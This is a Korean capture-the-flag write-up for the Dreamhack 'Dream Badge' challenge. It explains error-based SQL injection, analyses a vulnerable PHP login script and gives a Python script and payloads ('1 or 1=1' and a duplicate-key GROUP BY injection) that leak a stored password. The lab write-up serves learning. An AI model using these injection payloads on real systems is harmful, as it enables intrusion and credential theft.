# Challenge: dreamhack - Dream Badge 

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/342
이번엔 따로 코드를 제공하지 않는다.

## 추가 학습
### Error based SQL Injection
* extractvalue를 사용할 수 있다.
    ```sql
    SELECT extractvalue(1,concat(0x3a,version()));
    ```
    * extractvalue(XML, XPATH) 함수는 첫 번째 인자를 XML 데이터로 두 번째 인자로 XPATH 식 (XPATH는 XML Path Language)을 받는다.
    * 공격자가 두 번째 인자에 고의적으로 잘못된 XPATH를 넣으면, 에러 메시지가 발생하면서 잘못된 식의 문자열이 그대로 출력된다.
    * 예시로, concat(0x3a, version())을 XPATH 자리에 넣으면, 에러 메시지에 DB의 버전 정보가 포함된다. 즉, DB 버전을 에러 메시지를 통해 노출시킨 것이다.
    * 이를 조금 더 응용하면 다음과 같이 사용할 수 있다. 아래와 같이 사용하면 에러 메시지에 admin의 password가 포함된다!
        ```sql
        SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
        ```
* 중복 키 제약 위반 에러를 이용하기
    ```sql
    SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
    ```
    * COUNT(*)는 행의 개수를 세는 집계용 함수로, 뒤에 있는 GROUP BY와 연계해 그룹별 행의 개수를 가져온다.
    * CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x 는 세 부분(MySQL 데이터베이스 버전 정보를 반환하는 서브쿼리, 콜론에 해당하는 16진수, 0또는 1의값)을 조합한다. 그리고 합친 문자열을 x라는 별칭으로 둔다.
    * GROUP BY x 에 의해 결과는 x값을 기준으로 그룹화한다. MySQL에서는 GROUP BY를 처리할 때 내부적으로 temporary table을 만들어 그룹화된 결과를 저장한다. FLOOR(RAND(0))은 항상 같은 값을 반복해서 생성하기 때문에 해당 임시 테이블에 x 값이 중복해서 들어오려고 한다. 이때 중복 키 제약 위반 에러가 뜨면서 version 정보를 알아낼 수 있다.


## 문제 풀이
step 1
* 개발자 도구로 열어보니 다음과 같은 코드가 포함되어 있다. admin의 ID와 비밀번호를 전송하면 login_ok.php로 폼을 보내준다. login_ok.php 코드는 view-source로 확인 가능하다.
    ```html
    </head>
    <body>
    <div id='div_body'>
    <form method="post" action="login_ok.php"><table id='login_form'><tbody>
        <tr><td>ID</td><td><input type='text' name='id' readonly value="103.237.20.131" /></td></tr>
        <tr><td>PW</td><td><input type='password' name='pw' /></td></tr>
        <tr><td colspan='2'>
        <select name='type'> <option value='1'>admin</option> <option value='2' selected>user</option> </select>
        <input type='submit' value='login' />
        </td></tr>
    </tbody></table></form>
    </div>
    <div style='text-align:center;'><a href='./login_ok.php?view-source'>get source</a></div>
    <br />
    <div id='title'> welcome to SQL Injection world!! </div>
    </body>
    ```
* login_ok.php의 코드를 보자.
    ```php
    <?php
    if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
    }
    include("./inc.php"); // database connect, $FLAG.
    ini_set('display_errors',false);

    function err($str){ die("<script>alert(\"$str\");window.location.href='./';</script>"); }
    function uniq($data){ return md5($data.uniqid());}
    function make_id($id){ return mysql_query("insert into all_user_accounts values (null,'$id','".uniq($id)."','guest@nothing.null',2)");}
    function counting($id){ return mysql_query("insert into login_count values (null,'$id','".time()."')");}
    function pw_change($id) { return mysql_query("update all_user_accounts set ps='".uniq($id)."' where user_id='$id'"); }
    function count_init($id) { return mysql_query("delete from login_count where id='$id'"); }
    function t_table($id) { return mysql_query("create temporary table t_user as select * from all_user_accounts where user_id='$id'"); };

    if(empty($_POST['id']) || empty($_POST['pw']) || empty($_POST['type'])){
    err("Parameter Error :: missing");
    }

    $id=mysql_real_escape_string($_POST['id']);
    $ps=mysql_real_escape_string($_POST['pw']);
    $type=mysql_real_escape_string($_POST['type']);
    $ip=$_SERVER['REMOTE_ADDR'];

    sleep(2); // not Bruteforcing!!
    ```
    * id, pw, type을 post로 받아와 쿼리 관련 특수문자를 이스케이프 처리한다. 즉, SQL Injection에 대한 방비를 하고 있으며 slee(2)를 통해 bruteforce 또한 막는다. 여기서의 ip는 현재 접속한 클라이언트의 IP 주소이다. 참고로 요즘은 mysql_real_escape_string보다 mysqli+prepared statement를 쓰는 것이 안전하다.

* 이어서 마저 코드를 보자.id와 ip가 같아야 한다. 그리고 입력한 id를 쿼리문으로 돌려서 all_user_accounts에 있으면 넘어가고 없으면 make_id로 등록해준다. make_id에서 사용하는 uniq($id)는 uniqid()는 현재 시간과 마이크로초 단위 정밀도를 이용해 거의 중복되지 않는 고윳값을 만들어낸다.
    ```php
    if($id!=$ip){
        err("SECURITY : u can access with allotted id only");
    }

    $row=mysql_fetch_array(mysql_query("select 1 from all_user_accounts where user_id='$id'"));
    if($row[0]!=1){
        if(false === make_id($id)){
            err("DB Error :: create user error");
        }
    }
    ```
* login_count 테이블에서 해당 사용자 id의 로그인 횟수를 조회한다. count가 4번 이상이면 pw를 uniq로 업데이트해버린다. 현재 접속한 사용자 id 데이터만 포함하는, 사용자가 본인 데이터만 접근하도록 제한된 테이블인 t_user를 생성한다. 그리고 type에 "all_user_accounts" 문자열이 포함되면 접근을 차단해버린다. 그리고 로그인 시도 기록을 추가한다.
    ```php
    $row=mysql_fetch_array(mysql_query("select count(*) from login_count where id='$id'"));
    $log_count = (int)$row[0];
    if($log_count >= 4){
        pw_change($id);
        count_init($id);
        err("SECURITY : bruteforcing detected - password is changed");
    }
    
    t_table($id); // don`t access the other account

    if(preg_match("/all_user_accounts/i",$type)){
        err("SECURITY : don`t access the other account");
    }

    counting($id); // limiting number of query
    ```

* 이제 임시 테이블 t_user에서 id, ps, type이 일치하는지 확인한다. 로그인에 성공하면 로그인 시도 횟수를 출력하고 비밀번호까지 맞으면 flag를 출력한다.
    ```php
    if(false === $result=mysql_query("select * from t_user where user_id='$id' and ps='$ps' and type=$type")){
        err("DB Error :: ".mysql_error());
    }

    $row=mysql_fetch_array($result);
    
    if(empty($row['user_id'])){
        err("Login Error :: not found your `user_id` or `password`");
    }

    echo "welcome <b>$id</b> !! (Login count = $log_count)";
    
    $row=mysql_fetch_array(mysql_query("select ps from t_user where user_id='$id' and ps='$ps'"));

    //patched 04.22.2015
    if (empty($ps)) err("DB Error :: data not found..");

    if($row['ps']==$ps){ echo "<h2>wow! FLAG is : ".$FLAG."</h2>"; }

    ?>
    ```
* 결국 로그인에 성공하고 비밀번호 검증을 한번 더 하므로, 비밀번호까지 정확히 입력해야한다는 것을 알 수 있다. 비밀번호를 알아낼 수 있을까? 우선 어디에 injection을 할 수 있을까? id는 클라이언트 ip와 일치해야 하니 사실상 불가능하다. $result = mysql_query("select * from t_user where user_id='$id' and ps='$ps' and type=$type"); 로 쿼리문을 만드는데 id와 ps는 따옴표 안에 들어가는 반면, type은 따옴표를 쓰지 않고 들어가는 것을 알 수 있다. 따라서 sql injection target은 "type"으로 정하자.

step 2
* type에 "1 or 1=1"을 입력해 post해주자.
    ```python
    import requests

    port = 12997
    url = f"http://host8.dreamhack.games:{port}/login_ok.php"

    payload = "1 or '1'='1'"

    data = {"id": "211.213.152.57", "pw": "pw", "type": payload}

    req = requests.post(url, data=data)
    print(req.text)
    ```
    * 결과는 welcome <b>211.213.152.57</b> !! (Login count = 0) 로 로그인에 성공하는 것을 알 수 있다. 하지만 그 다음에 비밀번호를 검증하기 때문에 아직 플래그를 볼 수는 없다. 

* 페이로드는 error based sql injection을 사용하자. 로그인이 4번 제한되어 있기 때문에 alert로 에러 내용을 표시해준다는 점을 이용한다면 비밀번호를 알아낼 수 있을 것이다. 가장 먼저 시도한 것은 ExtractValue를 이용한 것이다. type에서 all_user_accounts를 필터링하기 때문에 t_user로 접근해야 한다.아래의 코드를 보내봤는데 에러가 뜬다. 
    ```
    "1 and ExtractValue(1,concat(0x01,(select pw from t_user where id=ip)))"
    ```
    * t_user를 두 번 여는 것이 불가능하다. 따라서 다른 방법을 쓰는 것이 좋을듯하다.
    ```<script>alert("DB Error :: Can't reopen table: 't_user'");window.location.href='./';</script>```
    

* 중복키 제약 위반 에러를 이용해보자. 기본은 아래와 같다. 이를 type에 적을 페이로드에 맞게 수정해보자. 
    ```sql
    SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
    ```
    * 비교구문으로 만들어 t/f 형으로 만들어줘야 하고, row(1,1)과 비교시키고 행 개수를 맞춰주기 위해 limit 1을 사용하자. type에 넣을 최종 페이로드는 다음과 같다. 
    ```
    "1 or (SELECT Count(*),CONCAT(ps,0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x limit 1)"
    ```

* type의 페이로드를 담아 요청하는 코드는 exploit.py에 있다. 해당 파일을 실행하면 아래와 같은 값을 얻을 수 있다. 
    ```
    <script>alert("DB Error :: Duplicate entry 'f95d4eee90018fc726e53f47c0c980a6:1' for key 'group_key'");window.location.href='./';</script>
    ```

## 결과
비밀번호가 f95d4eee90018fc726e53f47c0c980a6라는 걸 알았으니 그대로 브라우저에 입력해주면 플래그를 얻을 수 있다.